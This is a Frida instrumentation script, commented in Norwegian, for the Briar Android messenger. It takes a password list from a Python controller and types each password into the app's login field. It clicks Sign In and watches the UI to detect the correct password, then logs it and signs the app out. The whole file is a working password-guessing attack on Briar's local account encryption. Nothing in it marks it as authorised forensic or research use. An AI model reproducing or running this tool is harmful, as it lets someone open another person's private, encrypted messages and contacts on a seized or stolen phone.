"use strict";

var passordListe = [];  // En tom liste for å holde passordene
var PasswordFragment, TextInputEditText, StringClass, ButtonClass, ProgressBarClass;  // Globale variabler for klasser

// ANSI escape codes for farger og formatering
const RESET = "\x1b[0m";
const RED = "\x1b[31m";
const GREEN = "\x1b[32m";
const YELLOW = "\x1b[33m";
const BLUE = "\x1b[34m";
const BOLD = "\x1b[1m";

// RPC-eksportert funksjon for å motta passordene fra Python-skriptet
rpc.exports = {
    setPasswordList: function (passwords) {
        passordListe = passwords;
        console.log(BLUE + "► Passordliste mottatt. Antall passord: " + passordListe.length + RESET);

        // Før vi starter testing av passord, sjekk om appen allerede er logget inn
        checkIfLoggedIn().then((loggedIn) => {
            if (loggedIn) {
                console.log(RED + "✗ Appen er allerede logget inn. Logger ut først." + RESET);
                send({ type: 'error', message: 'Appen er allerede logget inn. Logger ut. Prøv igjen.' });
                
                // Kall signOutFromApp for å logge ut og avslutte appen
                signOutFromApp();
            } else {
                testAllePassord();  // Start testing hvis appen ikke er logget inn
            }
        });
    }
};

// Funksjon for å sjekke om klassen OpenDatabaseFragment er tilgjengelig
function isOpenDatabaseFragmentAvailable() {
    return new Promise(function(resolve) {
        var classFound = false;
        Java.enumerateLoadedClasses({
            onMatch: function (className) {
                if (className === "org.briarproject.briar.android.login.OpenDatabaseFragment") {
                    classFound = true;  // Klassen er funnet, som betyr at appen er logget inn
                }
            },
            onComplete: function () {
                resolve(classFound);  // Returnerer true hvis klassen er funnet, ellers false
            }
        });
    });
}

// Funksjon for å sjekke om Sign In-knappen er synlig (noe som indikerer feil passord)
function isSignInButtonVisible(instance) {
    return new Promise(function(resolve) {
        try {
            // Sjekk synligheten til Sign In-knappen
            var signInButton = instance.signInButton.value;
            if (signInButton && signInButton.getVisibility() === 0) {  // 0 betyr VISIBLE
                resolve(true);  // Knappen er synlig, feil passord
            } else {
                resolve(false);  // Knappen er ikke synlig
            }
        } catch (e) {
            console.log(RED + "✗ Feil ved sjekk av Sign In-knappen: " + e + RESET);
            resolve(false);
        }
    });
}

// Funksjon for å sjekke om progressbaren er synlig (noe som indikerer at passordet testes)
function isProgressBarVisible(instance) {
    return new Promise(function(resolve) {
        try {
            // Sjekk synligheten til progressbaren
            var progressBar = instance.progress.value;
            if (progressBar && progressBar.getVisibility() === 0) {  // 0 betyr VISIBLE
                resolve(true);  // Progressbar er synlig, testing foregår
            } else {
                resolve(false);  // Progressbar er ikke synlig
            }
        } catch (e) {
            console.log(RED + "✗ Feil ved sjekk av progressbaren: " + e + RESET);
            resolve(false);
        }
    });
}

// Funksjon for å sjekke om appen allerede er logget inn
function checkIfLoggedIn() {
    return isOpenDatabaseFragmentAvailable().then(function(classFound) {
        return classFound;  // Returnerer true hvis appen allerede er logget inn
    });
}

// Funksjon for å simulere klikk på "Sign In"-knappen
function clickSignInButton(instance) {
    return new Promise(function(resolve) {
        try {
            var signInButton = instance.signInButton.value;
            if (signInButton) {
                signInButton.performClick();  // Simulerer et klikk på "Sign In"-knappen
                resolve(true);  // Returner at klikket ble utført
            } else {
                resolve(false);  // Hvis knappen ikke finnes
            }
        } catch (e) {
            console.log(RED + "✗ Feil ved klikk på Sign In-knappen: " + e + RESET);
            resolve(false);
        }
    });
}

// Funksjon for å sjekke om appen er i riktig tilstand før vi tester passordene
function isAppReadyForLogin() {
    return new Promise(function(resolve) {
        Java.choose("org.briarproject.briar.android.login.PasswordFragment", {
            onMatch: function (instance) {
                resolve(true);  // Appen er klar for å logge inn
            },
            onComplete: function () {
                resolve(false);  // Appen er ikke klar ennå
            }
        });
    });
}

// Funksjon for å kjøre validatePassword med et passord
function testPassord(passord, index) {
    return new Promise(function(resolve) {
        setTimeout(function() {
            var passordNummer = (index + 1)
            console.log(YELLOW + "► Forsøker å logge inn med passordnr. " + passordNummer + ": " + BLUE + passord + RESET);
            
            send({
                type: 'status',
                message: {
                    passordNummer: passordNummer,
                    passord: passord,
                    status: "i prosess"
                }
            });

            // Før vi prøver å logge inn, sjekk om appen er i riktig tilstand
            isAppReadyForLogin().then(function(ready) {
                if (!ready) {
                    console.log(RED + "✗ Appen er ikke klar for innlogging." + RESET);
                    resolve(false);  // Vent til appen er klar
                    return;
                }

                // Kjør på hovedtråden med Java.scheduleOnMainThread
                Java.scheduleOnMainThread(function() {
                    // Finn den aktive instansen av PasswordFragment
                    Java.choose("org.briarproject.briar.android.login.PasswordFragment", {
                        onMatch: function (instance) {
                            // Hent password-feltet fra instansen
                            var passwordField = instance.password.value;

                            if (passwordField) {
                                try {
                                    // Kast passwordField til TextInputEditText-klassen
                                    var castedPasswordField = Java.cast(passwordField, TextInputEditText);

                                    // Hent Editable-objektet (returnert fra getText())
                                    var editable = castedPasswordField.getText();

                                    // Clear passordfeltet for hver iterasjon
                                    editable.clear();  // Tømmer passordfeltet

                                    // Sett inn passordet fra listen
                                    var nyttPassord = StringClass.$new(passord);
                                    editable.replace(0, 0, nyttPassord);  // Erstatt innholdet med det nye passordet

                                    // Klikk på "Sign In"-knappen for å starte passordvalideringen
                                    clickSignInButton(instance).then(function(success) {
                                        if (!success) {
                                            console.log(RED + "✗ Kunne ikke klikke på Sign In-knappen." + RESET);
                                            resolve(false);  // Fortsett testing selv om det oppstår en feil
                                            return;
                                        }

                                        // Start en løkke som sjekker Sign In-knappens synlighet, progressbaren og OpenDatabaseFragment
                                        var attempts = 0;
                                        var intervalId = setInterval(function() {
                                            attempts++;
                                            if (attempts > 100) {  // Timeout etter 10 sekunder (100 forsøk med 100ms ventetid)
                                                console.log(RED + "✗ Timeout ved testing av passord: " + passord + RESET);
                                                clearInterval(intervalId);
                                                resolve(false);
                                            }

                                            // Sjekk om Sign In-knappen er synlig (feil passord)
                                            isSignInButtonVisible(instance).then(function(isVisible) {
                                                if (isVisible) {
                                                    console.log(RED + "✗ Innlogging feilet med passordnr. " + (index + 1) + RESET);
                                                    clearInterval(intervalId);
                                                    resolve(false);  // Feil passord
                                                }
                                            });

                                            // Sjekk om progressbaren er synlig (passord under testing)
                                            isProgressBarVisible(instance).then(function(isVisible) {
                                                if (isVisible) {
                                                    console.log("⧗ Innlogging pågår" + RESET);
                                                }
                                            });

                                            // Sjekk om OpenDatabaseFragment er tilgjengelig (riktig passord)
                                            isOpenDatabaseFragmentAvailable().then(function(classFound) {
                                                if (classFound) {
                                                    console.log(GREEN + "✓ Innlogging lykkes med passord: " + RED + passord + RESET);
                                                    clearInterval(intervalId);
                                                    resolve(true);  // Stopper testing hvis klassen er tilgjengelig
                                                }
                                            });
                                        }, 5);  // Sjekk hvert 5 ms for en periode på 10 sekunder
                                    });

                                } catch (e) {
                                    console.debug("✗ Feil ved manipulering av passordfelt: " + e);
                                    resolve(false);  // Fortsett testing selv om det oppstår en feil
                                }
                            } else {
                                console.debug("✗ Kunne ikke finne passordfeltet");
                                resolve(false);  // Fortsett testing hvis passordfeltet ikke finnes
                            }
                        },
                        onComplete: function () {
                            // Søk etter PasswordFragment-instans fullført.
                        }
                    });
                });
            });
        }, 50); // Forsinkelse (ms) før passordtesting
    });
}


// Asynkron funksjon for å teste alle passordene
async function testAllePassord() {

    for (let i = 0; i < passordListe.length; i++) {
        let stop = await testPassord(passordListe[i], i);  // Venter til hver test er ferdig før neste startes
        
        if (stop) {
            send({ type: 'exit', message: 'suksess' });  // Send en melding til Python om at testingen er ferdig

            // Utfør signout etter vellykket innlogging
            signOutFromApp();
            return;
        }
    }
    console.log(RED + "Alle passord er testet." + RESET);
    send({ type: 'exit', message: 'faield' });  // Signal om at vi er ferdige
}

// Funksjon for å utføre signout ved hjelp av BriarActivity
function signOutFromApp() {
    Java.perform(function () {
        // Last inn BriarActivity-klassen
        var BriarActivity = Java.use("org.briarproject.briar.android.activity.BriarActivity");

        // Utfør signOut-metoden på hovedtråden
        Java.scheduleOnMainThread(function () {
            var activityInstance = null;  // Variabel for å holde referansen til BriarActivity-instansen

            // Finn en aktiv instans av BriarActivity
            Java.choose("org.briarproject.briar.android.activity.BriarActivity", {
                onMatch: function (instance) {
                    activityInstance = instance;
                },
                onComplete: function () {
                    if (activityInstance !== null) {
                        // Utfør signOut-funksjonen
                        console.log(GREEN + "✦ Forsøker å logge ut..." + RESET);
                        activityInstance.signOut(true, false);  // true = fjerne fra nylige apper, false = ikke slette konto

                        // Send melding til Python rett før vi avslutter appen
                        send({ type: 'info', message: 'Appen ble logget ut og avsluttet.' });

                        // Vent litt før appen avsluttes
                        setTimeout(function () {
                            // Kall finishAndExit for å sørge for at appen avslutter etter signOut
                            activityInstance.finishAndExit();
                        }, 100);  // Forsinkelse på 100ms for å gi Frida tid til å sende meldingen
                    } else {
                        send({ type: 'error', message: 'Kunne ikke finne BriarActivity-instansen.' });
                        console.log(RED + "✗ Kunne ikke finne BriarActivity-instansen." + RESET);
                    }
                }
            });
        });
    });
}




/* Sjekk om JAVA-VM er tilgjengelig */
if (Java.available) {
    Java.perform(function () {
        // Initialiser de nødvendige klassene globalt
        PasswordFragment = Java.use("org.briarproject.briar.android.login.PasswordFragment");
        TextInputEditText = Java.use("com.google.android.material.textfield.TextInputEditText");
        StringClass = Java.use("java.lang.String");
        ButtonClass = Java.use("android.widget.Button");
        ProgressBarClass = Java.use("android.widget.ProgressBar");

    });
} else {
    console.log(RED + "Java/Dalvik VM ikke tilgjengelig." + RESET);
}
